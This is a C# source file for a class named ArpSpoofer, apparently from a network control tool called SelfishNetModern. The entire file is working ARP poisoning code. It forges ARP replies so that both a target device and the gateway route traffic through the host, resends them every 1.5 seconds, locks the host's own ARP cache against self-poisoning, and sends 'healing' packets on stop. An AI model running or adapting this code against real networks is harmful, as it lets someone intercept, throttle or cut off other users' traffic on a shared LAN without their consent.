using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SelfishNetModern.Models;
using SharpPcap;

namespace SelfishNetModern.Services
{
    public class ArpSpoofer
    {
        private readonly ConcurrentDictionary<string, NetworkDevice> _controlledDevices = new(StringComparer.OrdinalIgnoreCase);
        private AdapterInfo? _adapter;
        private CancellationTokenSource? _spoofCts;
        private Task? _spoofTask;
        public bool IsRunning { get; private set; }

        public event Action<string>? LogMessage;

        public void SetAdapter(AdapterInfo adapter)
        {
            _adapter = adapter;
        }

        public void AddControlledDevice(NetworkDevice device)
        {
            if (device.IsGateway || device.IsSelf) return;
            if (!NetworkAdapterService.IsValidUnicastHost(device.IP, device.MAC, _adapter)) return;

            _controlledDevices[device.MacString] = device;

            // Lock local Windows ARP cache for target device so Windows never poisons itself
            if (_adapter != null && _adapter.InterfaceIndex > 0)
            {
                NetworkAdapterService.LockArpEntry(_adapter.InterfaceIndex, device.IP, device.MAC);
            }

            // Send immediate first poison burst
            SendPoisonPulseForDevice(device);
        }

        public void RemoveControlledDevice(NetworkDevice device)
        {
            if (_controlledDevices.TryRemove(device.MacString, out _))
            {
                // Unlock local Windows ARP cache
                if (_adapter != null && _adapter.InterfaceIndex > 0)
                {
                    NetworkAdapterService.UnlockArpEntry(_adapter.InterfaceIndex, device.IP);
                }

                // Send healing packets to unpoison
                HealDevice(device);
            }
        }

        public void Start()
        {
            if (IsRunning) return;
            if (_adapter == null || _adapter.NativeDevice == null || _adapter.GatewayIp == null || _adapter.GatewayMac == null)
            {
                LogMessage?.Invoke("Cannot start ARP spoofer: Adapter or Gateway information missing.");
                return;
            }

            // Lock local Windows ARP cache for Gateway to protect our host from self-poisoning
            if (_adapter.InterfaceIndex > 0)
            {
                NetworkAdapterService.LockArpEntry(_adapter.InterfaceIndex, _adapter.GatewayIp, _adapter.GatewayMac);
            }

            IsRunning = true;
            _spoofCts = new CancellationTokenSource();
            _spoofTask = Task.Run(() => SpoofLoopAsync(_spoofCts.Token));
            LogMessage?.Invoke("ARP Redirection engine started.");
        }

        public void Stop()
        {
            if (!IsRunning) return;

            IsRunning = false;
            _spoofCts?.Cancel();
            try
            {
                _spoofTask?.Wait(1000);
            }
            catch { }

            // Heal all currently controlled devices
            HealAll();

            // Unlock local Windows ARP cache for controlled devices and Gateway
            if (_adapter != null && _adapter.InterfaceIndex > 0)
            {
                foreach (var device in _controlledDevices.Values)
                {
                    NetworkAdapterService.UnlockArpEntry(_adapter.InterfaceIndex, device.IP);
                }
                if (_adapter.GatewayIp != null)
                {
                    NetworkAdapterService.UnlockArpEntry(_adapter.InterfaceIndex, _adapter.GatewayIp);
                }
            }

            _controlledDevices.Clear();
            LogMessage?.Invoke("ARP Redirection engine stopped. All network caches healed.");
        }

        private async Task SpoofLoopAsync(CancellationToken token)
        {
            while (!token.IsCancellationRequested && IsRunning)
            {
                try
                {
                    // Ensure gateway ARP entry remains locked and immune to self-poisoning
                    if (_adapter != null && _adapter.GatewayIp != null && _adapter.GatewayMac != null && _adapter.InterfaceIndex > 0)
                    {
                        NetworkAdapterService.LockArpEntry(_adapter.InterfaceIndex, _adapter.GatewayIp, _adapter.GatewayMac);
                    }

                    var devices = _controlledDevices.Values.Where(d => d.IsControlled && !d.IsGateway && !d.IsSelf).ToList();
                    foreach (var device in devices)
                    {
                        if (token.IsCancellationRequested) break;
                        SendPoisonPulseForDevice(device);
                    }
                }
                catch (Exception ex)
                {
                    LogMessage?.Invoke($"ARP spoof loop error: {ex.Message}");
                }

                try
                {
                    await Task.Delay(1500, token); // Pulse every 1.5 seconds
                }
                catch (OperationCanceledException)
                {
                    break;
                }
            }
        }

        private void SendPoisonPulseForDevice(NetworkDevice device)
        {
            if (_adapter?.NativeDevice == null || _adapter.GatewayIp == null || _adapter.GatewayMac == null)
                return;

            if (!NetworkAdapterService.IsValidUnicastHost(device.IP, device.MAC, _adapter))
                return;

            try
            {
                // 1. Poison Target: Gateway is at Our MAC
                var poisonTargetPacket = BuildArpPacket(
                    senderMac: _adapter.MacAddress,
                    senderIp: _adapter.GatewayIp,
                    targetMac: device.MAC,
                    targetIp: device.IP
                );
                SendRawPacket(poisonTargetPacket);

                // 2. Poison Gateway: Target is at Our MAC
                var poisonGatewayPacket = BuildArpPacket(
                    senderMac: _adapter.MacAddress,
                    senderIp: device.IP,
                    targetMac: _adapter.GatewayMac,
                    targetIp: _adapter.GatewayIp
                );
                SendRawPacket(poisonGatewayPacket);
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"Failed to send poison pulse to {device.IP}: {ex.Message}");
            }
        }

        public void HealDevice(NetworkDevice device)
        {
            if (_adapter?.NativeDevice == null || _adapter.GatewayIp == null || _adapter.GatewayMac == null)
                return;

            if (!NetworkAdapterService.IsValidUnicastHost(device.IP, device.MAC, _adapter))
                return;

            try
            {
                // Heal Target: Restore real Gateway MAC to Target
                var healTarget = BuildArpPacket(
                    senderMac: _adapter.GatewayMac,
                    senderIp: _adapter.GatewayIp,
                    targetMac: device.MAC,
                    targetIp: device.IP
                );

                // Heal Gateway: Restore real Target MAC to Gateway
                var healGateway = BuildArpPacket(
                    senderMac: device.MAC,
                    senderIp: device.IP,
                    targetMac: _adapter.GatewayMac,
                    targetIp: _adapter.GatewayIp
                );

                // Send 5 times to ensure network table heals reliably
                for (int i = 0; i < 5; i++)
                {
                    SendRawPacket(healTarget);
                    SendRawPacket(healGateway);
                    Thread.Sleep(10);
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"Failed to heal {device.IP}: {ex.Message}");
            }
        }

        public void HealAll()
        {
            foreach (var device in _controlledDevices.Values)
            {
                HealDevice(device);
            }
        }

        private static byte[] BuildArpPacket(PhysicalAddress senderMac, IPAddress senderIp, PhysicalAddress targetMac, IPAddress targetIp)
        {
            var arp = new ArpPacket(
                ArpOperation.Response,
                targetMac,
                targetIp,
                senderMac,
                senderIp
            );

            var eth = new EthernetPacket(
                senderMac,
                targetMac,
                EthernetType.Arp
            )
            {
                PayloadPacket = arp
            };

            return eth.Bytes;
        }

        private void SendRawPacket(byte[] packetBytes)
        {
            try
            {
                _adapter?.NativeDevice?.SendPacket(packetBytes);
            }
            catch
            {
                // Suppress transient send exception
            }
        }
    }
}
